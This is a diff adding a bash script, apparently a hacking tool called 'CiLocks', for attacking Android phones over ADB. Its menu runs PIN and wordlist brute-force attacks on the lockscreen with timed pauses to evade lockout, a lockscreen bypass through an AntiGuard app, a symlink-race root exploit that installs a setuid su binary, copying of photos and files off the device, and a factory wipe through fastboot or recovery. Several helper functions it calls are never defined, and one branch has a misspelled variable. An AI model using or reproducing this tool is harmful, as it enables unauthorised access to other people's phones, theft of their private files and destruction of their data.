@@ -1,0 +1,214 @@
+#!/usr/bin/env bash
+# Refrence
+# adb shell input keyevent 26 && adb shell input keyevent 82 && adb shell input text 1337 && adb shell input keyevent 66
+# https://stackoverflow.com/questions/29072501/how-to-unlock-android-phone-through-adb
+# http://www.hak5.org/episodes/hak5-1205
+# https://github.com/kosborn/p2p-adb
+# https://forum.xda-developers.com/t/universal-guide-root-any-android-device-manually.2684210/
+# https://stackoverflow.com/questions/14685721/how-can-i-do-factory-reset-using-adb-in-android
+m="\e[0;31m" # merah
+k="\e[0;33m" # kuning
+h="\e[0;32m" # hijau
+b="\e[0;34m" # biru
+lm="\e[1;31m" # merah terang
+lk="\e[1;33m" # kuning terang
+lh="\e[1;32m" # hijau terang
+lb="\e[1;34m" # langit biru
+n="\e[0m" # netral
+w="\e[1;37m" # putih tebal
+clear
+echo -e "${lb}
+   _______ __               __
+  / ____(_) /   ____  _____/ /_______
+ / /   / / /   / __ \/ ___/ //_/ ___/
+/ /___/ / /___/ /_/ / /__/ ,< (__  )
+\____/_/_____/\____/\___/_/|_/____/
+${n}"
+echo -e "${m}   Crack Interface LockScreen${n}"
+echo -e "${lb}      LoliC0d3 - Tegal1337${n}"
+echo -e "${lh}
+1.Brute Pin 4 Digit
+2.Brute Pin 6 Digit
+3.Brute LockScreen Using Wordlist
+4.Bypass LockScreen {Antiguard} Not Support All OS Version
+5.Root Android {Supersu} Not Support All OS Version
+6.Still File
+7.Reset Data
+${n}"
+read -p "senpai@tegalsec:~# " select
+if [[ $select == 1 ]]; then
+  # adb shell input keyevent 26 #Pressing the lock button
+  adb shell input keyevent 82
+
+  echo "Brute Pin 4 Digit"
+  for i in {0000..9999}; do
+      echo "Try =>" $i
+
+      for (( j=0; j<${#i}; j++ )); do
+          adb shell input keyevent $((`echo ${i:$j:1}`+7))
+      done
+
+      adb shell input keyevent 66
+
+      if ! (( `expr $i + 1` % 5 )); then
+          adb shell input keyevent 66
+          echo "Delay Limit 30s"
+          sleep 30
+          adb shell input keyevent 82
+          adb shell input swipe 407 1211 378 85
+      fi
+  done
+
+elif [[ $select == 2 ]]; then
+  # adb shell input keyevent 26 #Pressing the lock button
+  adb shell input keyevent 82
+
+  echo "Brute Pin 6 Digit"
+  for i in {000000..999999}; do
+      echo "Try =>" $i
+
+      for (( j=0; j<${#i}; j++ )); do
+          adb shell input keyevent $((`echo ${i:$j:1}`+7))
+      done
+
+      adb shell input keyevent 66
+
+      if ! (( `expr $i + 1` % 5 )); then
+          adb shell input keyevent 66
+          echo "Delay Limit 30s"
+          secs=$((1 * 30))
+          while [ $secs -gt 0 ]; do
+             echo -ne "$secs\033[0K\r"
+             sleep 1
+             : $((secs--))
+          done
+
+          sleep 30
+          adb shell input keyevent 82
+          adb shell input swipe 407 1211 378 85
+      fi
+  done
+
+elif [[ $select == 3 ]]; then
+  # adb shell input keyevent 26 #Pressing the lock button
+  adb shell input keyevent 82
+  echo "Brute LockScreen Using Wordlist"
+  read -p "list -> " files
+  for i in `cat $files`; do
+      echo "Try =>" $i
+
+      for (( j=0; j<${#i}; j++ )); do
+          adb shell input keyevent $((`echo ${i:$j:1}`+7))
+      done
+
+      adb shell input keyevent 66
+
+      if ! (( `expr $i + 1` % 5 )); then
+          adb shell input keyevent 66
+          echo "Delay Limit 30s"
+          secs=$((1 * 30))
+          while [ $secs -gt 0 ]; do
+             echo -ne "$secs\033[0K\r"
+             sleep 1
+             : $((secs--))
+          done
+
+          sleep 30
+          adb shell input keyevent 82
+          adb shell input swipe 407 1211 378 85
+      fi
+  done
+
+elif [[ $select == 4 ]]; then
+  adb shell pm list packages | grep io.kos.antiguard 2>/dev/null > /dev/null
+
+isInstalled=$?
+
+
+if [ $isInstalled -eq 0 ]; then
+	adb uninstall io.kos.antiguard
+else
+	adb install ./AntiGuard/AntiGuard.apk
+	adb shell am start io.kos.antiguard/.unlock
+fi
+
+elif [[ $select == 5 ]]; then
+  adb restore modules/fakebackup.ab
+
+command "while ! ln -s /data/local.prop /data/data/com.android.settings/a/file99 2>/dev/null; do :; done; echo 'Overwrote local.prop!';"
+
+if command "cat /data/local.prop"
+	then echo "Succesfully rooted!"
+	echo "Requires a reboot..."
+	adb reboot
+	sleep 2
+	adb wait-for-device
+	command "mount -o rw,remount /system"
+	adb push modules/su-static /system/xbin/su
+	command "/data/local/tmp/busybox chown 0:0 /system/xbin/su"
+	command "/data/local/tmp/busybox chmod 6777 /system/xbin/su"
+	adb push modules/Superuser.apk /system/app/
+	command "rm /data/local.prop"
+	adb reboot
+fi
+
+elif [[ $select == 6 ]]; then
+  echo -e "${lh}
+  1.Image Still
+  2.Manual Still
+  ${n}"
+  read -p "senpai@tegalsec:~# " select
+  if [[ $select == 1 ]]; then
+    dir=$(adb shell '[[ -d /sdcard/DCIM/Camera/  ]] && echo 1' | tr -d "\r")
+
+    if [ "$dir" = "1" ]; then
+    	path='/sdcard/DCIM/Camera'
+    	getSearch "$path" "*.jpg"
+    else
+    	echo "Camera directory doesn't exist?"
+    fi
+  elif [[ $select == 2 ]]; then
+    read -p "Enter Path File: " path
+      dir=$(adb shell '[[ -d '$path' ]] && echo 1' | tr -d "\r")
+
+      if [ "$dir" = "1" ]; then
+      	getSearch "$path" "/*"
+      else
+      	echo $path" directory doesn't exist?"
+      fi
+  else
+     echo -e  "${m} Your Brain Error!${n}"
+    fi
+elif [[ $select == 7 ]]; then
+  echo -e "${lh}
+  1.Fastboot
+  2.Recovery
+  ${n}"
+  read -p "senpai@tegalsec:~# " select
+  if [[ $select == 1 ]]; then
+    adb reboot bootloader
+    deviceConnected=konek
+    	if [ "$(konek)" = 'NO' ]; then
+    		echo "Waiting Phone..."
+    		$adb wait-for-device
+      fi
+        fastboot devices
+        fastboot erase userdata
+        fastboot erase cache
+   elif [[ $slect == 2 ]]; then
+     deviceConnected=konek
+     	if [ "$(konek)" = 'NO' ]; then
+     		echo "Waiting Phone..."
+     		$adb wait-for-device
+       fi
+       adb devices
+       adb shell recovery --wipe_data
+  else
+    echo -e  "${m} Your Brain Error!${n}"
+  fi
+
+
+
+else
+  echo -e  "${m} Your Brain Error!${n}"
+  fi
